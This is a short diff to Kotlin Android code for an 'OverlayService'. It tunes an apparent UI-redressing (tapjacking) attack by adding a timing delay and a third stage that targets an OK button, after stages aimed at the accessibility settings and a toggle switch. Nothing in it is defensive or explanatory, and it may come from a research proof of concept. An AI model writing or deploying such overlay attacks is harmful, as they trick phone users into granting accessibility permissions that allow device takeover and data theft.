@@ -35,12 +35,14 @@ class OverlayService : Service() {
                 val intent = Intent(Intent.ACTION_MAIN)
                 intent.addCategory(Intent.CATEGORY_HOME)
                 intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                Thread.sleep(Config.OVERLAY_DELAY)
                 startActivity(intent)
             }
         }
         val stages = ArrayList<Stage>()
         stages.add(AccessibilityStage(this, listener))
         stages.add(ToggleSwitchStage(this, listener))
+        stages.add(OkButtonStage(this, listener))
         attack = RedressingAttack(stages)
     }
 
